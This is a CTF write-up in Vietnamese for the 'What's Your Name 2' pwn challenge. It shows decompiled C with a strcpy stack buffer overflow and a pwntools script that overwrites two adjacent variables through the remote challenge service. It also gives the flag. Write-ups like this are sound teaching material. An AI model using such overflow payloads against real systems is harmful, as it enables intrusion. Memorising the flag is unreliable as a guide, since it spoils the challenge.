# What's Your Name 2
## Mô tả
> Let us know your name and make sure you have enough money ;P        
> nc 198.211.115.81 10002              
> Flag Format : KCTF{S0m3_T3x7_H3r3}                  
> Author : NomanProdhan

File binary: [whats_your_name_two]

## Phân tích
Kiểm tra file và  checksec
![image](https://user-images.githubusercontent.com/62021009/150631218-4a3daace-e59b-4c8b-b0ba-194213b8282c.png)      
Sử dụng IDA Pro để xem mã giả của chương trình
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[208]; // [rsp+0h] [rbp-120h] BYREF
  char dest[72]; // [rsp+D0h] [rbp-50h] BYREF
  int v6; // [rsp+118h] [rbp-8h]
  int v7; // [rsp+11Ch] [rbp-4h]

  v6 = 0;
  v7 = 0;
  printf("What's your name ? ");
  fflush(_bss_start);
  fgets(s, 200, stdin);
  strcpy(dest, s);
  if ( v7 == 0x5445454C && v6 == 0x534B544E )
  {
    printf("I liked your name and you got enough money :D");
    system("cat /home/hacker/flag.txt");
  }
  else
  {
    printf("Sorry ! I didn't like your name and you don't have enough money. Come one earn some money.");
  }
  return 0;
}
```
- Ban đầu chương trình lấy đầu vào từ người dùng và lưu vào biến `s`
- Copy nội dung từ biến `s` sang biến `dest`, ta nhận thấy ở đây có lỗi **buffer overflow**, vì biến s được khai báo 208 bytes trong khi đó biến dest chỉ có 72 bytes
- Các biến v6, v7 ban đầu được gán bằng 0 nhưng sau đó chương trình lại so sánh với 2 giá trị ở trên.
- Các biến dest, v6, v7 nằm liên tiếp nhau trên stack
## Solution
Vì các biến nằm liên tiếp nhau trên stack, như vậy đầu tiên ta sẽ chèn 72 bytes để lấp đầy biến dest, sau đó là 2 giá trị cần để so sánh vào biến v6 và v7 (lưu ý thứ tự trên stack sẽ là dest -> v6 -> v7)        
Ta có file exploit.py như sau:
```python
from pwn import *

s = remote('198.211.115.81', 10002)
payload = b'a'*72 + p32(0x534B544E) + p32(0x5445454C)
s.sendlineafter(b'name ? ', payload)
s.interactive()
```
![image](https://user-images.githubusercontent.com/62021009/150631609-4e80e778-99c4-46f1-9cb4-b2656d5818f4.png)
> Flag: KCTF{bUfF3r_0v3Rf1Ow_i5_fUn_r1Gh7}
